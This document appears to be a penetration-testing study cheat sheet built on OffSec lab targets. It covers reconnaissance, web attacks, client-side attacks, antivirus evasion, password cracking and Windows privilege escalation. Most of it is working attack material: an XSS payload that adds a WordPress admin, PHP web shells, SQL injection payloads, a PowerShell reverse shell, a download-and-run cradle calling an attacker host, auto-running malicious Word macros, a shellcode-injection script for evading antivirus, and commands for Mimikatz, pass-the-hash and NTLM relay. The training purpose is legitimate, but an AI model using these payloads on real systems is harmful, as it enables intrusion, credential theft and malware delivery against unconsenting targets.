# Information Gathering

## Whois Enumeration

* -h \<WHOIS server's IP address>

```bash
whois megacorpone.com -h 192.168.50.251
whois 38.100.193.70 -h 192.168.50.251
```

## DNS Enumeration

* **NS**: Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain.
* **A**: Aka a **host** record, contains the IPv4 address of a hostname (such as www.megacorpone.com).
* **AAAA**: Aka a quad A host record, contains the IPv6 address of a hostname (such as www.megacorpone.com).
* **MX**: Mail Exchange records contain the names of the servers responsible for handling email for the domain. A domain can contain multiple MX records.
* **PTR**: Pointer Records are used in reverse lookup zones and can find the records associated with an IP address.
* **CNAME**: Canonical Name Records are used to create aliases for other host records.
* **TXT**: Text records can contain any arbitrary data and be used for various purposes, such as domain ownership verification.

```bash
host -t mx megacorpone.com
```

```bash
for ip in $(cat list.txt); do host $ip.megacorpone.com; done
```

```bash
for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"
```

Windows **nslookup**

```bat
nslookup mail.megacorptwo.com
nslookup -type=TXT info.megacorptwo.com 192.168.50.151
```

* -d \<domain name>
* -t \<type of enumeration>
    * std: standard scan
    * brt: brute force
* -D \<file name containing potential subdomain strings>

```bash
dnsrecon -d megacorpone.com -t std
dnsrecon -d megacorpone.com -D ~/list.txt -t brt .
```

Automate DNS enumeration with **DNSEnum**

```bash
dnsenum megacorpone.com
```

## TCP/UDP Port Scannning

* -w \<connection timeout in seconds>
* -z: zero-I/O mode, used for scanning and sends no data.
* -u: UDP scan

```bash
nc -nvv -z -w 1 192.168.50.152 3388-3390
nc -nv -u -z -w 1 192.168.50.149 120-123
```

Sweep for hosts with an open port 445 on the /24 subnet

```bash
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done 
```

Checks if an IP responds to ICMP and whether a specified TCP port on the target host is open

```pwsh
Test-NetConnection -Port 445 192.168.50.151
```

Scan the first 1024 ports on the Domain Controller

```pwsh
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
```

## Port Scanning with Nmap

```bash
nmap -p 80 192.168.50.1-253
```

```bash
nmap --script-help http-headers
nmap --script http-headers 192.168.50.6
```

* -sn: network sweep

```bash
nmap -sn 192.168.50.1-253
```

* -sS: TCP SYN scan
* -sU: UDP scan

```bash
sudo nmap -sU -sS 192.168.50.149
```

* -sT: connect scan (default), need to be used when scanning via certain types of proxies
* -A: enable OS version detection, script scanning, and traceroute

```bash
nmap -sT -A --top-ports=20 192.168.50.1-253 -oG top-port-sweep.txt
```

* -O: OS fingerprinting
```bash
sudo nmap -O 192.168.50.14 --osscan-guess
```

## SMB Enumeration

```bash
nmap -v -p 139,445 -oG smb.txt 192.168.50.1-254
nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152
```

Query the NetBIOS name service for valid NetBIOS names
```bash
sudo nbtscan -r 192.168.50.0/24
```

List all the shares running on dc01
```bat
net view \\dc01 /all
```

List available shares
```bash
smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
```

## SMTP Enumeration
```pwsh
Test-NetConnection -Port 25 192.168.50
```

Interact with the SMTP service
```bat
telnet 192.168.50.8 25
```

Install the Telnet client
```pwsh
dism /online /Enable-Feature /FeatureName:TelnetClient
```

A **VRFY** request asks the server to verify an email address, while **EXPN** asks the server for the membership of a mailing list

```bash
$ nc -nv 192.168.50.8 25
(UNKNOWN) [192.168.50.8] 25 (smtp) open
220 mail ESMTP Postfix (Ubuntu)
VRFY root
252 2.0.0 root
VRFY idontexist
550 5.1.1 <idontexist>: Recipient address rejected: User unknown in local recipient table
```

`python3 smtp.py root 192.168.50.8`
```python
#!/usr/bin/python

import socket
import sys

if len(sys.argv) != 3:
 print("Usage: vrfy.py <username> <target_ip>")
 sys.exit(0)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = sys.argv[2]

connect = s.connect((ip,25))
banner = s.recv(1024)
print(banner)

user = (sys.argv[1]).encode()
s.send(b'VRFY ' + user + b'\r\n')
result = s.recv(1024)
print(result)

s.close()
```

## SNMP Enumeration
```bash
sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt
```

**onesixtyone**
```bash
echo public > community.txt
echo private >> community.txt
echo manager >> community.txt
```

Attempt a brute force attack against a list of IP addresses
```bash
for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
onesixtyone -c community.txt -i ips 
```

**snmpwalk**

Enumerates the entire MIB tree using:
* -c \<community string>
* -v \<SNMP version number>
* -t \<timeout period>

```bash
snmpwalk -c public -v1 -t 10 192.168.50.151
```

Parse a specific branch of the MIB Tree called **OID**
```bash
snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25 
```

| **MIB values** | **Description** |
| -------------- | --------------- |
| 1.3.6.1.2.1.25.1.6.0 | System Processes |
| 1.3.6.1.2.1.25.4.2.1.2 | Running Programs |
| 1.3.6.1.2.1.25.4.2.1.4 | Processes Path |
| 1.3.6.1.2.1.25.2.3.1.4 | Storage Units |
| 1.3.6.1.2.1.25.6.3.1.2 | Software Name |
| 1.3.6.1.4.1.77.1.2.25 | User Accounts |
| 1.3.6.1.2.1.6.13.1.3 | TCP Local Ports |


# Vulnerability Scanning with Nmap

```bash
cat /usr/share/nmap/scripts/script.db | grep "\"vuln\""
```

```bash
sudo nmap -sV -p 443 --script "vuln" 192.168.50.124
sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" 192.168.50.124
```

# Web Application Attacks
## Web Application Enumeration
```bash
sudo nmap -p80 -sV 192.168.50.20
```

```bash
gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
```

## Enumerating and Abusing APIs
`pattern.txt`
```
{GOBUSTER}/v1
{GOBUSTER}/v2
```

```bash
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern.txt
```

```bash
curl -X 'PUT' 'http://192.168.50.16:5002/users/v1/admin/password' -H 'Content-Type: application/json' -H 'Authorization: OAuth eyJ0.eyJl.OeZH' -d '{"password": "pwned"}'
```

## XSS
**User-Agent** HTTP header: `<script>alert(42)</script>`

AJAX
```js
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];

var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

To minify attack code into a one-liner, navigate to **JS Compress**.

Encode the minified JavaScript code so any bad characters won't interfere with sending the payload

```js
function encode_to_javascript(string) {
    var input = string
    var output = '';
    for(pos = 0; pos < input.length; pos++) {
        output += input.charCodeAt(pos);
        if(pos != (input.length - 1)) {
            output += ",";
        }
    }
    return output;
}

let encoded = encode_to_javascript('<insert_minified_javascript>')
console.log(encoded)
```

```bash
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(<encoded JS code>))</script>" --proxy 127.0.0.1:8080
```

## Directory Traversal
On Linux, use the `/etc/passwd` file;

On Windows, use `C:\Windows\System32\drivers\etc\hosts`, which is readable by all local users.

If the target system is running the IIS web server, => log paths and web root structure.
* The logs are located at `C:\inetpub\logs\LogFiles\W3SVC1\`.
* `C:\inetpub\wwwroot\web.config` may contain sensitive information like passwords or usernames.

```bash
curl http://mountain.com/index.php?page=../../home/offsec/.ssh/id_rsa
```

### Apache 2.4.49 LFI
```bash
curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/etc/passwd
```

## File Inclusion Vulnerabilities
On a target running XAMPP, the Apache logs can be found in `C:\xampp\apache\logs\`.

### LFI
```bash
curl http://mountaindesserts.com/index.php?page=../../var/log/apache2/access.log
```

### PHP Wrappers
Use the **php://filter** wrapper to display the contents of files either with or without encodings like ROT13 or Base64

```bash
curl http://mountaindesserts.com/index.php?page=php://filter/resource=admin.php

curl http://mountaindesserts.com/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```

Use the **data://** wrapper to embed data elements as plaintext or base64-encoded data in the running web application's code
```bash
curl "http://mountaindesserts.com/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```

```bash
echo -n '<?php echo system($_GET["cmd"]);?>' | base64

curl "http://mountaindesserts.com/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

### RFI
`simple-backdoor.php`
```php
<?php
if(isset($_REQUEST['cmd'])) {
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

```bash
curl "http://mountaindesserts.com/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls" RFI
```

## File Upload Vulnerabilities
To combine the file upload mechanism with another vulnerability, e.g., Directory Traversal, XXE or XSS:
- Overwrite files like **authorized_keys** using a relative path (`../../root/.ssh/authorized_keys`) in the file upload request.

- Embed an **XXE** attack to display file contents or even execute code when we are allowed to **upload an avatar** to a profile with an **SVG** file type

To bypass simple filters that only check for the most common file extensions, change the file extension to **.phps** or **.php7**.

Change file extension to **.pHP**

Use PowerShell to encode the reverse shell one-liner
```pwsh
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
```

* -enc \<encoded string>

```bash
curl http://192.168.50.189/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20<encoded reverse shell one-liner> 
```

Create an SSH keypair with **ssh-keygen**, and `authorized_keys` file containing the previously created public key.

```bash
ssh-keygen

cat filename.pub > authorized_keys
```

## Command Injection Vulnerabilities
Determine if our commands are executed by PowerShell or CMD
```bat
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

## SQL Injection Attacks
```bash
mysql -u root -p'root' -h 192.168.50.16 -P 3306
```

**impacket**
```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```

Vunerable SQL query:
`$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";`

### Authentication bypass

SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --

```
offsec' OR 1=1 -- //
```

### Error-based payloads

```
' or 1=1 in (select @@version) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

Vunerable SQL query: 
`$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";`

Orders the results by a specific column => number of columns
```
' ORDER BY 1-- //
```

### UNION-based payloads
```
' UNION SELECT null, null, database(), user(), @@version -- //
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```

### Blind SQL Injections
```
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //

http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```


```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

### sqlmap
`wp.req`
```
GET /wp-admin/admin-ajax.php?action=get_question&question_id=1* HTTP/1.1
Host: alvida-eatery.org
...
```

```bash
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump

sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"

sqlmap -r wp.req -p 'question_id' -D wordpress -T wp_users --dump --technique=T --flush-session
```

### MySQL
```
select version();
select system_user();
show databases;
```

### SQL Server

* When using a **SQL Server** command line tool like **sqlcmd**, we must submit our SQL statement ending with a **semicolon** followed by **GO** on a separate line.

* When running the command remotely, we can omit the GO statement since it's not part of the ***MSSQL TDS protocol***.

```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```

```
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM offsec.information_schema.tables;
select * from offsec.dbo.users;
```

Enable **xp_cmdshell** function
```
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```

### PostgreSQL
```bash
psql -h 192.168.50.63 -p 2345 -U postgres
```

```
postgres=# \l
postgres=# \c confluence
confluence=# select * from cwd_user;
```

# Client-side Attacks
- Malicious **JScript** code executed through the **Windows Script Host**

- **.lnk** shortcut files pointing to malicious resources.

- Microsoft Office documents with embedded malicious **macros**. Macros can be written in **Visual Basic for Applications (VBA)**, which is a scripting language with full access to **ActiveX objects** and the Windows Script Host, similar to JavaScript in HTML Applications.

- An **HTML Application (HTA)** attached to an email to execute code in the context of Internet Explorer and to some extent, Microsoft Edge.

- Older client-side attack vectors, including **Dynamic Data Exchange (DDE)** and various **Object Linking and Embedding (OLE)** methods do not work well today without significant target system modification.

## Target Reconnaissance 
**Canarytokens**, a free web service that generates a link with an embedded token that we'll send to the target. When the target opens the link in a browser, => get information about their **browser, IP address, and operating system**.

Use an online IP logger like **Grabify or JavaScript fingerprinting libraries** such as **fingerprint.js**.

```bash
exiftool -a -u brochure.pdf
```

## Leveraging Microsoft Word Macros

Split the base64-encoded string into smaller chunks of 50 characters and concatenate them into the **Str** variable

```python
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
n = 50
for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```

```VB
Sub AutoOpen()
 MyMacro
End Sub

Sub Document_Open()
 MyMacro
End Sub

Sub MyMacro()
 Dim Str As String
 Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
 Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
 ...
 Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
 Str = Str + "A== "
 CreateObject("Wscript.Shell").Run Str
End Sub
```

## Obtaining Code Execution via Windows Library Files

A **Windows library file** connecting to a **WebDAV** share

 1. The victim receives a `.Library-ms` file, perhaps via email. When they double-click the file, it will appear as a regular directory in Windows Explorer.

 2. In the WebDAV directory, we'll provide a `.lnk` shortcut file to execute a PowerShell reverse shell. The user must double-click our `.lnk` payload file to execute it.

```bash
pip3 install wsgidav
mkdir /home/kali/webdav

/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

The **location of the item** input field of the `automatic_configuration.lnk` shortcut file

```pwsh
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1'); powercat -c 192.168.119.3 -p 4444 -e powershell"
```

`config.Library-ms`
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

# Public Exploits
The **Browser Exploitation Framework (BeEF)** is a penetration testing tool focused on client-side attacks executed within a web browser.

## Locating Public Exploits

```bash
searchsploit remote smb microsoft windows
searchsploit "Sync Breeze Enterprise 10.0.28"
searchsploit -m windows/remote/48537.py
searchsploit -m 42031
```

```bash
grep Exploits /usr/share/nmap/scripts/*.nse
nmap --script-help=clamav-exec.nse
```

## Fixing Exploits

Generate our own payload to target the x86 platform and format it for C code

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

```C
unsigned char retn[] = "\x83\x0c\x09\x10"; // 0x10090c83 modify the return address
```

### Cross-Compiling Exploit Code
* -lws2_32: find the **winsock** library

```bash
sudo apt install mingw-w64

i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

```bash
wine syncbreeze_exploit.exe
```

# Antivirus Evasion

VirusTotal, **AntiScan.Me**

* -b: dump file's binary representation

```bash
xxd -b malware.txt 
```

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe
```

## On-disk evasion
- Packers, obfuscators, crypter
- Anti-reversing, anti-debugging, virtual machine emulation detection.
- Software protectors like anti-copy
- The Enigma Protector

## In-Memory evation**
- **Remote Process Memory Injection** attempts to inject the payload into another valid PE that is not malicious.
 1. By leveraging a set of Windows API, first, we would use the **OpenProcess** function to obtain a valid **HANDLE** to a target process that we have permission to access.

 2. After obtaining the HANDLE, we would allocate memory in the context of that process by calling a Windows API such as **VirtualAllocEx**.

 3. Once the memory has been allocated in the remote process, we would copy the malicious payload to the newly allocated memory using **WriteProcessMemory**.

 4. After the payload has been successfully copied, it is usually executed in memory in a separate thread using the **CreateRemoteThread** API.

- **Regular DLL injection** involves loading a malicious DLL from disk using the **LoadLibrary** API

- **Reflective DLL Injection** technique attempts to load a DLL stored by the attacker in the process memory. The main challenge is that **LoadLibrary** does not support loading a DLL from memory. Attackers must write their own version of the API that does not rely on a disk-based DLL.

- **Process Hollowing**, first launch a non-malicious process in a suspended state. Once launched, the image of the process is removed from memory and replaced with a malicious executable image. Finally, the process is then resumed and malicious code is executed instead of the legitimate process.

- **Inline hooking** involves modifying memory and introducing a hook (an instruction that redirects the code execution) into a function to make it point to our malicious code. Upon executing our malicious code, the flow will return back to the modified function and resume execution, appearing as if only the original code had executed. Hooking is a technique often employed by **rootkits**. Rootkits aim to provide the malware author dedicated and persistent access to the target system through modification of system components in user space, kernel, or even at lower OS protection rings such as boot or hypervisor. Since rootkits need administrative privileges to implant its hooks, it is often installed from an elevated shell or by exploiting a privilege-escalation vulnerability.

## Evading AV with Thread Injection

Shellcode for `bypass.ps1` PowerShell script
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc
```

Remote process memory injection technique: target the currently executing process (the x86 PowerShell interpreter)

`bypass.ps1`
```pwsh
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
[Byte[]];
[Byte[]] $sc = <place your shellcode here>;
$size = 0x1000;
if ($sc.Length -gt 0x1000) {$size = $sc.Length};
$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};
$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

## Automate AV evasion payloads

**Shellter**, a dynamic shellcode injection tool, uses a number of novel techniques to backdoor a valid and non-malicious executable file with a malicious shellcode payload. Shellter attempts to use the existing PE **Import Address Table** (IAT) entries to locate functions that will be used for the memory allocation, transfer, and execution of our payload.

```bash
apt-cache search shellter
sudo apt install shellter

sudo apt install wine
dpkg --add-architecture i386 && apt-get update && apt-get install wine32
```

# Password Attacks

## Attacking Network Services Logins

```bash
gzip -d rockyou.txt.gz

hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
hydra -l eve -P wordlist 192.168.50.214 -t 4 ssh -V

hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202

hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

## Password Cracking

### Mutating Wordlists

Delete all lines starting with a "1"
```bash
sed -i '/^1/d' demo.txt 
```

#### Rule file for Hashcat
`demo.rule`
* $ function to append a character or
* ^ to prepend a character

```
$1
c
$1 c $!
```

Display the mutated passwords
```bash
hashcat -r demo.rule --stdout demo.txt
```

#### Rule file for John the Ripper
`ssh.rule`
```
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```

### Crack MD5
```bash
hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo.rule --force
```

### Password Manager

```pwsh
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

```bash
keepass2john Database.kdbx > keepass.hash

hashcat --help | grep -i "KeePass"

hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

### SSH Private Key Passphrase

```bash
ssh2john id_rsa > ssh.hash
```

Append the contents of our rule file into `/etc/john/john.conf`
```bash
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf' 
```

`ssh.passwords` is a wordlist file containing the passwords

```bash
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

```bash
chmod 600 id_rsa
ssh -i id_rsa -p 2222 dave@192.168.50.201
```

```bash
hashcat -h | grep -i "ssh"
hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
```

## Working with Password Hashes

### Cracking NTLM
Mimikatz includes the **sekurlsa** module, which extracts password hashes from the Local Security Authority Subsystem (LSASS) process memory.

**LSASS** is a process in Windows that handles user authentication, password changes, and access token creation. LSASS caches NTLM hashes and other credentials. LSASS runs under the **SYSTEM** user, which even more privileged than a process started as **Administrator**.

=> we can only extract passwords if we are running Mimikatz as Administrator (or higher) and have the **SeDebugPrivilege** access right enabled, which grants us the ability to debug not only processes we own, but also all other users' processes.

We can also elevate our privileges to the SYSTEM account with tools like **PsExec** or the built-in Mimikatz **token elevation function**. The token elevation function requires the **SeImpersonatePrivilege** access right to work, but all local administrators have it by default.

```bat
mimikatz.exe
```

* `privilege::debug`: have the **SeDebugPrivilege** access right enabled
* `token::elevate`: elevate to **SYSTEM** user privileges.
* `sekurlsa::logonpasswords`: attempts to extract plaintext passwords and password hashes from all available sources.
* `lsadump::sam`: extract the NTLM hashes from the SAM.

```bash
hashcat --help | grep -i "ntlm"

hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```


### Passing NTLM
- For **SMB enumeration and management**, we can use **smbclient** or **CrackMapExec**.

- Use **NTLM hashes** to connect to target systems with **SMB**, but also via other protocols like **RDP** and **WinRM**, if the user has the required rights.

Connect to the SMB share **secrets**
```bash
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```

Since Windows Vista, all Windows versions have **UAC remote restrictions** enabled by default. This prevents software or commands from running with administrative rights on remote systems. This effectively mitigates this attack vector for users in the **local administrator group** aside from the local Administrator account.

If we don't use the **local Administrator user** in **pass-the-hash**, the target machine also needs to be configured in a certain way to obtain successful **code execution**. 

- For **command execution**, we can use the scripts from the **impacket** library like `psexec.py` and `wmiexec.py`.

- psexec.py script from the **impacket** library is very similar to the original **Sysinternals PsExec** command. It searches for a writable share and uploads an executable file to it. Then it registers the executable as a Windows service and starts it.

Obtain a shell as the **SYSTEM** user
```bash
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

Obtain a shell as the **Administrator** user
```bash
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212 
```

### Cracking Net-NTLMv2
**Net-NTLMv2** network authentication protocol is responsible for managing the authentication process for Windows clients and servers over a network.

To gain access to an SMB share on a Windows 2022 server from a Windows 11 client via Net-NTLMv2:

1. At a high level, we'll send the server a request, outlining the connection details to access the SMB share.

2. Then the server will send us a challenge in which we **encrypt data for our response with our NTLM hash** to prove our identity.

3. The server will then check our challenge response and either grant or deny access, accordingly.

Net-NTLMv2 is less secure than the more modern **Kerberos** protocol. In the real-world, the majority of Windows environments still rely on the older protocol, to support older devices that may not support Kerberos.

We need our target to start an authentication process using Net-NTLMv2 against a system we control.

The **Responder** tool includes a built-in SMB server that handles the authentication process for us and prints all captured Net-NTLMv2 hashes. It also includes other protocol servers (including HTTP and FTP) as well as Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Service (NBT-NS), and Multicast DNS (MDNS) poisoning capabilities.

```bash
sudo responder -I tap0
```

If we've **obtained code execution** on a remote system, we can easily force it to authenticate with us by commanding it to connect to our prepared SMB server. E.g., we can simply run (assuming our Responder is listening on that IP).

```pwsh
dir \\192.168.119.2\test
```

```bash
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
```

If we **don't have code execution**, we can also use other vectors to force an authentication. E.g., when we discover a **file upload** form in a web application on a Windows server, we can try to enter a non-existing file with a UNC path like `\\192.168.119.2\share\nonexistent.txt`. If the web application supports uploads via **SMB**, the Windows server will authenticate to our SMB server.

### Relaying Net-NTLMv2
If we have access to **FILES01** as an **unprivileged** user, => we cannot run Mimikatz to extract passwords.

Using the steps from the previous section, imagine we obtained the Net-NTLMv2 hash, but couldn't crack it because it was too complex.

If the user may be a **local administrator** on another machine. => try to use the hash on another machine in what is known as a **relay attack**.

* --no-http-server: disable the HTTP server since we are relaying an SMB connection
* -smb2support: add support for SMB2
* -t: set the target to FILES02.
* -c: set our command which will be executed on the target system as the relayed user.

```bash
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
```

**ntlmrelayx** received an SMB connection and used it to authenticate to our target by relaying it
```pwsh
dir \\192.168.119.2\test
```

# Windows Privilege Escalation
Windows uses only the **SID** (not usernames) to identify principals for access control management.
- A SID is a unique value assigned to each entity, or principal, that can be authenticated by Windows, such as users and groups.

- The SID for local accounts and groups is generated by the Local Security Authority (LSA), and for domain users and domain groups, it's generated on a Domain Controller (DC).

- The SID cannot be changed and is generated when the user or group is created.

- The SID string consists of different parts, delimited by "-"

`S-R-X-Y`

- R: stands for revision and is always set to "1"

- X: determines the **identifier authority** that issues the SID. E.g., 5  specifies **NT Authority** and is used for local or domain users and groups.

- Y: represents the **sub authorities** of the identifier authority. Every SID consists of one or more sub authorities. The **domain identifier** is the SID of the domain for domain users, the SID of the local machine for local users, and "32" for built-in principals. The **relative identifier (RID)** determines principals such as users or groups.

E.g., SID of a local user on a Windows system with RID is 1001

`S-1-5-21-1336799502-1441772794-948155058-1001`

RID starts at 1000 for nearly all principals, => this is the 2nd local user created on the system.

SIDs that have a RID under 1000 are called **well-known SIDs**. These SIDs identify **generic and built-in groups and users**.

## List of Well known SIDs on local machines
| **SID** | **Description** |
| ------- | --------------- |
| S-1-0-0 | Nobody |
| S-1-1-0 | Everybody |
| S-1-5-11 | Authenticated Users |
| S-1-5-18 | Local System |
| S-1-5-domainidentifier-500 | Administrator |

Once a user is authenticated, Windows generates an **access token** that is assigned to that user. The token itself describes the **security context** of a given user.

The **security context** is a set of rules or attributes that are currently in effect. The security context of a token consists of the SID of the user, SIDs of the groups the user is a member of, the user and group privileges, and further information describing the scope of the token.

When a user starts a process or thread, a token will be assigned to these objects. This token, called a **primary token**, specifies which permissions the process or threads have when interacting with another object and is a copy of the access token of the user.

A thread can also have an **impersonation token** assigned. Impersonation tokens are used to provide a different security context than the process that owns the thread. => the thread interacts with objects on behalf of the impersonation token instead of the primary token of the process.

Windows also implements **Mandatory Integrity Control**. It uses **integrity levels** (hierarchies of trust in a running application or securable object) to control access to securable objects.

When processes are started or objects are created, they receive the integrity level of the principal performing this operation. One exception is if an executable file has a low integrity level, the process's integrity level will also be low. A principal with a lower integrity level cannot write to an object with a higher level, even if the permissions would normally allow them to do so.

From Windows Vista onward, processes run on 4 integrity levels:
- System: SYSTEM (kernel, ...)
- High: Elevated users
- Medium: Standard users
- Low: very restricted rights often used in sandboxed[^privesc_win_sandbox] processes or for directories storing temporary data

We can display the integrity level of processes with **Process Explorer** for our current user with `whoami /groups`, and for files with **icacls**.

**User Account Control (UAC)** protects the OS by running most applications and tasks with standard user privileges, even if the user launching them is an Administrator. For this, an administrative user obtains 2 access tokens after a successful logon.
1. **Standard user token** (or filtered admin token), which is used to perform all non-privileged operations.
2. **Regular administrator token** will be used when the user wants to perform a privileged operation. To leverage the administrator token, a **UAC consent prompt** needs to be confirmed.

**Built-in groups** such as Administrators, **Backup Operators**, **Remote Desktop Users**, and **Remote Management Users**.

Members of:
- **Backup Operators** can backup and restore all files on a computer, even those files they don't have permissions for.
- **Remote Desktop Users** can access the system with RDP
- **Remote Management Users** can access it with WinRM.

